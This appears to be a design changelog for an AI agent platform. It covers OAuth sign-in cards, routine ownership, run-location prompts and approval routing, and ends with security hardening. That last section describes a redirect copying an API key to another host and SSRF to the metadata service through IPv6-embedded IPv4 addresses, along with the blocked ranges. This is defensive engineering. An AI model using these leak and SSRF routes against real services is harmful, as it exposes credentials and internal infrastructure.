- **`auth_propose`** shows a **choice card** (`AuthCard::Choose`) built entirely by the host from the kept plan: "Sign in with X" and "Use an API key or token instead", the host's recommendation (§6.7.3: OAuth unless it needs a client secret that isn't configured), a detail line (no setup / needs your own app, with the setup URL / needs a client secret), and notes on provenance ("From tern's built-in Google profile.", "Found via auth.notion.com metadata (verified).", "Unverified: from the service's docs…"), the sign-in page's host, scopes and the profile's caveats. Only the service's name is the agent's (cut to 40 characters). The answer is recorded on the plan; **`connection_add` refuses a method other than the one the user chose**. A plan with no OAuth returns `key` without a card (nothing to choose). A researched plan (`plan: {…}`) has every host-derived field reset before validation, so the agent can't claim it is verified, registrable or confidential, and a refused plan opens no card. Nobody to answer (non-interactive) is `choice: "none"`.
- **`connection_add`** (granted write; the card is the gate, as with `secret_request`): `target` (a connector, active or draft, or an MCP server), optional `connection`, `label`, `method`, `plan_id`. OAuth config comes from the chosen plan, else an existing account's, else the built-in profile named by the connector's `capabilities.oauth` (whose provider must match the plan's). The client: `[auth.clients.<provider>]`, a client ID metadata document, or **registration per account** (each account registers its own client, bound to its own loopback port; signing in again keeps that account's client and port, and registers again only if the port is taken). The **sign-in card** (`AuthCard::SignIn`) carries the authorize URL (or a device code) and closes on its own when the browser comes back: the daemon drops the pending card when the tool stops waiting and sends `auth_prompt_closed`. The answer is `cancel`, or `device` to switch to a code when the provider has a device flow. Nobody attached on a non-interactive run means "skipped" at once rather than a five-minute wait. At most 3 sign-in cards per run. The result is `connected` / `reconnected` / `skipped` / `timed_out` with the slug, account and whether it is the default; never a token.
- **Same account twice** (§6.8.3): after a sign-in, an account label that matches an existing connection of the target (case-insensitively) refreshes that connection's tokens and config instead of making a duplicate, whatever slug was asked for, and says `reconnected`.
- **Slugs**: `default` for a target's first account; after that from the account (`me@inngest.com` → `inngest`; for personal mail domains, the local part: `me@gmail.com` → `me`), made unique with a number.
- **Keys per account**: `method: "key"` asks through the usual private secret prompt for the target's declared secrets under the account's names (`conn/linear/work/LINEAR_KEY`; plain names for `default`, so the first account's key is where `secret_request` would put it). The prompt names the account ("The key for linear · work"). A missing key for an extra account tells the agent to call `connection_add` with that connection and `method: "key"`, since `secret_request` takes plain names only.
- **The browser leg runs on tern's machine**: the core binds the loopback listener and the front end opens the URL (desktop and TUI on the same machine). For a remote core, the card's `device` answer switches to the device flow where the provider has one; the spec's "the app runs the browser leg and hands the code over" isn't built, since a code typed at the app would need a second redirect target and the device flow covers the case.
- **Front ends**: `ApprovalHandler::ask_auth` (default `None`). The daemon's router sends the card to API clients (`ApiAuthPrompts`: pending list, `{auth_prompt: …}` / `{auth_prompt_closed: id}` events, `POST /v1/auth-prompts/{id}` accepting only answers the card offers) and, for a run in a Telegram chat, a **pointer only** ("🔐 … sign in in the tern app or the TUI; the sign-in page opens there, not in this chat"), edited when it ends, like secret requests. The TUI draws the card in the transcript (↑/↓ and Enter or a number to choose; Enter opens the page with the OS opener, the URL passed as one argument, never through a shell; `d` for a code; Esc cancels); an attached TUI gets cards from the daemon (owner devices only) and closes them on `auth_prompt_closed`. `/connections` lists accounts.
- **API** (`api_connections.rs`, all owner-only, feature `connections`): `GET /v1/connections` (accounts plus the targets accounts can be added to and the methods each offers), `POST /v1/connections` (OAuth holds the request open until the sign-in ends, with its card on the event stream; key takes `values` by the declared names, refusing names the target doesn't declare), `…/{kind}/{target}/{slug}/reconnect`, `/default`, `PATCH` (label), `DELETE`. `connections_changed` events after any change.
- **CLI**: `tern connections [list|add|reconnect|default|rename|remove]`, working on the database and secrets.toml directly (like `tern agents`), so it needs no daemon. `add` opens the browser here (or `--device`), `--key` asks for the secrets hidden.
- **Tests**: tern-auth `tests/tools.rs` (the choice card's options, recommendation and provenance; a fake browser completing three sign-ins through registration and PKCE: two accounts with their own clients and tokens, then the first account again reconnected, not duplicated; a key per account; nobody there skipping; a researched lookalike refused with no card; no OAuth meaning a key with no card; a swapped method refused); tern `tests/connections.rs` (the agent's sign-in card through the daemon with the real Google authorize URL, PKCE and loopback redirect, late clients finding it, a wrong answer refused, cancel closing it and the tool reporting skipped; key accounts over the API, default, removal, and the key nowhere in the database, logs or event stream); tern-tui (choosing, opening the page, a device code replacing the page, the tool's end closing the card).

## Routines made in conversation stay findable (fix)

The bug: tern, asked in a topic channel to "schedule Research to look something up", called `schedule_create`. The routine was tern's, filed under Home (`channel_id` empty), with a prompt telling tern to ask Research. The desktop only re-read routines after a routine's own run, and nothing announced a new one, so no view showed it until a reconnect.

- **`schedule_create` takes `agent`.** The routine is that agent's: it runs as that agent, on its model and tools, and posts to its DM (or the topic). Allowed for the caller itself or an agent it may delegate to (`AgentRow::may_delegate_to`, the rule `agent_spawn {agent}` follows), checked by the host. The tool's description says to use it instead of writing "ask Research" into the prompt.
- **The routine belongs to the agent that runs it, not the one that asked.** The `schedule_*` tools stay strict: tern can't later list or change Research's routine. Allowing delegators would have let tern, whose unset `delegates` reaches everyone, see every agent's jobs. The user manages it from the app, through the link.
- **Made in a topic channel, a routine posts there** and its agent joins the channel, as `POST /v1/schedules {channel}` already did. In a DM or Home, as before.
- **The result carries `tern://routine/<id>`**, in the `tern://` scheme the spec reserves for deep links, and asks the model to pass it on. The desktop opens the editor for that link anywhere markdown is shown. A `schedule_create` or `schedule_update` result in a conversation becomes a routine card instead of the old "Created a routine" pill. In topic channels, which show posts and not tool calls, the card is drawn under any post that links a routine.
- **`schedules_changed {id}` on `/v1/events`** comes from the tools (a `Notify` hook on `ScheduleCreate`/`Update`/`Delete`, wired in the runtime) and from the API's create, update and delete. Run results still refresh through `run_finished`, as before.
- **Three places, one row widget.** The agent's side panel (unchanged); the channel's side panel shows the routines posting there (**All** for every one), and its header has a clock with their count; LIBRARY › Routines lists every routine with its agent, where it posts and its next run. The Library section now always shows, since Routines needs no optional feature.

## Where you are (every conversation run's prompt)

The user's report: an agent answering in `#grokbot-research` ended with "Should I post these findings to #grokbot-research, or write them up as a file?". It was already there, and its answer was the post. The cause, confirmed: the prompt said where a run was only when the channel had `instructions` (C0's `## Channel #slug`), and it never said that the answer is delivered by itself.

- **One always-present section, `## Where you are`**, in every conversation run's frozen prompt (`tern_core::channels::where_section`, built by `Runtime::where_section` in `start_run`). It replaces the instructions section and AP2's "Agents in #slug" section.
  - **A topic channel**: "You're in the #slug channel ("Title")". The reply is posted there automatically, so the agent shouldn't offer to post it, and `channel_post` is only for an update mid-run or another channel. When it has more than one agent, the members, with the lead and "you" marked, and whether agents' mentions wake anyone. That the channel is one conversation, everyone's posts being context. Then the user's instructions, if any.
  - **Home**: "your direct line with the user", and the reply is the next message. **An agent's DM**: "You're in Research's DM", likewise.
  - **A routine's run**: "This is a run of the routine "Title". Your result is posted to #x (or Home, or Name's DM) and sent to Telegram by itself" (the push target named by its gateway). Routines are told this instead of a place, because their session is private.
  - **A sub-agent or delegate** (`subagent_where_section`, in `Subagents::spawn`): "You're working for tern in #slug. Your final message is your report: it goes back to tern, not to the user or the channel." Without `"post": true` it adds "Don't post to the channel or offer to"; with it, that it may `channel_post` and its report is posted. A nested child names its parent's label.
- **Frozen**, like the rest of the prompt: replay reads the run's stored prompt, so a channel renamed or joined later changes the next run only.
- **Short on purpose**: two or three sentences per place. The member list appears only when there is someone else. Taint is unchanged: posts from tainted runs still arrive wrapped through the digest.
- **Tests**: `channels::tests::every_place_says_where_the_run_is_and_where_its_reply_goes` (each kind, a channel without instructions still gets the section, members and instructions), and `tests/where_you_are.rs` against the daemon: the frozen prompts of a run in a topic channel without instructions, in Home, in a DM, a sub-agent and a routine.

## Approvals land where the work is

The user started a chat in `#home-service-market`; the agent needed an approval and the card appeared in Home. "Is this the correct behavior for the outbox? If not, we should fix that and make sure that the approvals land where they actually are meant to." It reverses C2's "approvals and secret requests move to Home" and AP1's mirror (agent-profiles open question 1, now answered).

- **Where a run's requests wait** is one lookup, `waiting::conversation_of(root session)`: a routine's private session goes to the channel it posts to (`schedules.channel_id`; its own session sits in Home), anything else to its session's channel; Home when there is none or it's archived. Sub-agents and delegates already ask as their tree's root, so they land in the top-level run's conversation, not in the delegate's DM. `Router::at` (so `channel_id` on `approval_requested`, `secret_requested`, sign-in cards) and `Manager::outbox_view` both use it, so routine outbox items now wait in the routine's channel too.
- **Outside Home, a waiting request is a `needs_you` post** in that conversation (key `approval:<id>` / `secret:<id>`, by the asking run's agent, tainted when the run is). C4's store writes the Home pointer in the same transaction, so the pointer, `needs_you` counts, and clearing on every surface come from the existing mechanism, as the outbox's did. A guard (`waiting::Waiting`) closes it however the wait ends: the post is rewritten to how it ended ("Approved: …", "Denied: …", "Skipped: secret X", "No longer waiting: …" on cancel), resolved with its pointer, and both go out as `post_updated`. An approval is only posted while a client listens; with none it goes straight to the outbox, which posts its own. Home's own requests get no post: their card is in Home's stream. Posts and pointers carry `approval_id` / `secret_request_id`; "Done" on them is refused (`409`), since the run is still waiting for an answer.
- **Counts**: a channel's `needs_you` is its open posts; Home's is its pointers plus its own waiting requests (it no longer adds every request on top of the pointers). The tray (`pending_approvals` in `/v1/status`) and notifications still count everything.

## Connector and SSRF hardening, review follow-up

An independent review of main (0775f64) found two low-severity gaps next to T4b-i.

- **A redirect can't carry a credential to a host its entry isn't sent to.** T4b-i followed redirects hop by hop and injected credentials only for the hop's own host. But a server could copy a value it had received into `Location`, for example a query key (`…other.net/?api_key=K`), and the new URL was only checked against the allowlist. Now `http_request` records each value it sends, keyed by the `auth` entry that sent it. A hop is refused before anything is sent if its URL contains such a value, raw or percent-decoded, and that entry doesn't apply to the hop's host (or the request opted out with `auth = false` / `auth = "OTHER"`). The error names the host, not the URL, since the URL holds the value. Refusing rather than stripping: the value can sit anywhere in the URL, and an API that redirects keys to another host is broken anyway. A redirect back to a host that gets the credential anyway is still followed. Test: `redirects_cannot_carry_a_credential_to_another_host` covers a query key and a percent-encoded bearer token in a path.
- **`is_public` judges IPv6 addresses that carry an IPv4 one by that address.** Before, only mapped `::ffff:0:0/96` was unwrapped. Now `embedded_v4` also unwraps IPv4-compatible `::/96`, NAT64 `64:ff9b::/96` (DNS64 can turn a v4-only name into `64:ff9b::a9fe:a9fe`, the metadata service), and 6to4 `2002::/16` (bits 16–47). `::1` becomes `0.0.0.1` and is refused. Some ranges are refused outright: deprecated site-local `fec0::/10`, local-use NAT64 `64:ff9b:1::/48`, Teredo `2001::/32` (its client address is obfuscated, and Teredo is unused), documentation `2001:db8::/32` and discard `100::/64`. Connectors, gateways and the OAuth `Guard` all go through `is_public`, so they all get this.
